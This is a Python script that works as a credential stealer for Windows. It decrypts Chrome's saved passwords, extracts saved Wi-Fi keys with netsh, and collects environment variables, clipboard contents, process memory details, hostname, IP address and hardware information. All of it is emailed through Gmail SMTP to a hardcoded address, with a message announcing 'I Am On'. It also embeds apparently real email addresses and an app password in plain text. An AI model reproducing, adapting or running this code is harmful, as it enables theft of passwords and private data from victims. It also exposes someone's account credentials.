import smtplib
from email.mime.text import MIMEText
import subprocess
import os
import pyperclip  # Library to access clipboard data
import psutil  # Library to access system and process information
import wmi
import win32crypt
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
from Crypto.Cipher import AES
import socket


def chrome_date_and_time(chrome_data):
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)


def fetching_encryption_key():
    local_computer_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
        "User Data", "Local State"
    )

    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = json.loads(f.read())

    encryption_key = base64.b64decode(
        local_state_data["os_crypt"]["encrypted_key"]
    )
    encryption_key = encryption_key[5:]  # Remove DPAPI str
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]


def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]

        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except Exception:
            return "No Passwords"


def one_of_main():
    def main():
        key = fetching_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromePasswords.db"
        shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)
        cursor = db.cursor()

        cursor.execute(
            "SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins "
            "ORDER BY date_last_used"
        )

        for row in cursor.fetchall():
            main_url = row[0]
            login_page_url = row[1]
            user_name = row[2]
            decrypted_password = password_decryption(row[3], key)

            if user_name or decrypted_password:
                cursor.close()
                db.close()
                return main_url, login_page_url, user_name, decrypted_password

        cursor.close()
        db.close()
        return None, None, None, None

    return main()


def get_clipboard_data():
    try:
        return pyperclip.paste()
    except Exception as e:
        return f"Error accessing clipboard: {str(e)}"


def get_wifi_passwords():
    wifi_passwords = {}
    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

        for i in profiles:
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                wifi_passwords[i] = results[0] if results else ""
            except subprocess.CalledProcessError:
                wifi_passwords[i] = "ENCODING ERROR"
    except Exception as e:
        return {"Error": str(e)}
    return wifi_passwords  # Return the dictionary here

def get_env_variables():
    names = []
    values = []
    for name, value in os.environ.items():
        names.append(name)
        values.append(value)
    return names, values


def dump_memory():
    memory_info = {}
    try:
        for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
            memory_info[proc.info['name']] = proc.info['memory_info']
    except Exception as e:
        memory_info['Error'] = str(e)
    return memory_info


# Get data
wifi_passwords = get_wifi_passwords()
env_names, env_values = get_env_variables()
clipboard_data = get_clipboard_data()

c = wmi.WMI()
my_system = c.Win32_ComputerSystem()[0]

memory_dump = dump_memory()

# Email configuration
sender_email = "luka.guja.py@gmail.com"
receiver_email = "lukas.gujabidze@gmail.com"
password = "pdnk ituz gfbo vkqh "

hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)

url, login_url, username, its_password = one_of_main()

# Create the email content
subject = "I Am On"
body = f"""I am on computer next time change this code and let's see what else we got here:
        ---------------------------------------------------------------------------


        Wifi Passwords: {wifi_passwords}
        Your Computer Name is: {hostname}
        Your Computer IP Address is: {IPAddr}



        Env variables:
        -------------------------------
        names: {env_names}
        values: {env_values}


        ----------------------------------
        Clipboard Data: {clipboard_data}


        ------------------------------------
        Memory Dump: {memory_dump}






        ------------------------------------------
        Manufacturer: {my_system.Manufacturer}
        Model: {my_system.Model}
        Name: {my_system.Name}
        NumberOfProcessors: {my_system.NumberOfProcessors}
        SystemType: {my_system.SystemType}
        SystemFamily: {my_system.SystemFamily}



        ---------------------------------------------
        URL : {url}
        Login URL : {login_url}
        Username : {username}
        Password : {its_password}"""  # Include memory dump in the email

msg = MIMEText(body)
msg['Subject'] = subject
msg['From'] = sender_email
msg['To'] = receiver_email

# Connect to Gmail's SMTP server and send the email
with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, msg.as_string())
